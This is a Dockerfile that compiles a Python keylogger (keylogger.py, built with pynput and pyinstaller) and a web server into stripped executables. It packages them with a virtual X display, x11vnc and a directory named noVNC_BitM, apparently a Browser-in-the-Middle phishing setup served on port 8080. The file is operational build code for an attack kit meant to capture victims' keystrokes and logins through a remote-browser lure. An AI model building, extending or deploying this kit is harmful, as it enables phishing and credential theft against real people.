# Stage 1: Compilation stage
FROM debian:11-slim AS builder

ENV USER=root
ENV DEBIAN_FRONTEND=noninteractive
ENV LIBGL_ALWAYS_SOFTWARE=1
ENV DISPLAY=:10

RUN apt update && apt upgrade -y && \
    apt install -y xvfb python3 python3-pip build-essential python3-pyqt5.qtwebengine

RUN pip3 install --no-cache-dir pynput pyinstaller
COPY keylogger.py /opt/keylogger.py
COPY web.py /opt/web.py

WORKDIR /opt
RUN Xvfb :10 -screen 0 1920x1080x24 & \
    pyinstaller --onefile --strip web.py && \
    pyinstaller --onefile --strip keylogger.py

# Stage 2: Final Stage
FROM debian:11-slim

ENV USER=root
ENV DEBIAN_FRONTEND=noninteractive
ENV LIBGL_ALWAYS_SOFTWARE=1
ENV DISPLAY=:10

RUN ln -fs /usr/share/zoneinfo/Europe/Rome /etc/localtime && \
    apt update && \
    apt upgrade -y && \
    apt install -y xvfb x11vnc fluxbox tzdata python3-minimal python3-numpy procps

EXPOSE 8080

# Copy the executables and assets from the builder stage
COPY --from=builder /opt/dist/web /opt/web
COPY --from=builder /opt/dist/keylogger /opt/keylogger
COPY ./noVNC_BitM /opt/novnc

COPY setup.sh /opt/setup.sh

CMD ["/bin/bash", "-c", "chmod +x /opt/setup.sh; /opt/setup.sh && tail -f /dev/null"]

